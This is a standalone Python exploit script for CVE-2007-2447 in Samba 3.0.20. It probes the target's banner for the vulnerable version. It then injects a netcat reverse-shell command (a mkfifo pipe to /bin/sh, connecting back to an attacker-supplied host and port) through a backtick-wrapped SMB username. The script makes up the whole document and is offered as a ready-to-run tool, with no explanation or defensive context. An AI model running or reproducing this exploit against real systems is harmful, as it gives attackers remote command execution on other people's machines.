import argparse
import sys
import platform
import socket
from log_colors import *
from smb.SMBConnection import SMBConnection

class CVE2007_2447:

    def __init__(self, lhost, lport, rhost, rport):
        self.lhost, self.lport = lhost, int(lport)
        self.rhost, self.rport = rhost, int(rport)

    def is_vuln(self):
        print (LogColors.BLUE + "check samba version..." + LogColors.ENDC)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((self.rhost, self.rport))
            sock.send('WhoAreYou\r\n'.encode("utf-8"))
            result = sock.recv(100).decode("utf-8")
            sock.close()
            print (LogColors.YELLOW + result + LogColors.ENDC)
            if "Samba" in result and "3.0.20" in result:
                print (LogColors.GREEN + "host may be vulnerable :)" + LogColors.ENDC)
                return True
            else:
                print (LogColors.RED + "not found samba :(" + LogColors.ENDC)
                return False
        except Exception as e:
            print (LogColors.RED + 'cannot connect to ' + str(self.rport) + ' port' + LogColors.ENDC)
            print (LogColors.RED + str(e) + LogColors.ENDC)
        return False

    def run(self):
        payload = 'mkfifo /tmp/sss; nc ' + str(self.lhost) + ' ' + str(self.lport) + ' 0</tmp/sss | /bin/sh >/tmp/sss 2>&1; rm /tmp/sss'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(self.rhost, int(self.rport), timeout=1)
        except:
            print (LogColors.GREEN + 'payload successfully send. check netcat :)' + LogColors.ENDC)

    
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-lh','--lhost', required = True, help = "LHOST")
    parser.add_argument('-lp','--lport', required = True, help = "LPORT")
    parser.add_argument('-rh','--rhost', required = True, help = "the target host")
    parser.add_argument('-rp','--rport', required = True, help = "the target port")
    args = vars(parser.parse_args())
    
    if 'Linux' not in platform.platform():
        sys.exit(LogColors.RED + "for exploit linux machine required :(" + LogColors.ENDC)
    else:
        print (LogColors.YELLOW + str(platform.platform()) + " detected: OK" + LogColors.ENDC)

    lhost, lport = args['lhost'], args['lport']
    rhost, rport = args['rhost'], args['rport']
    cve = CVE2007_2447(lhost, lport, rhost, rport)
    #cve.is_vuln()
    cve.run()
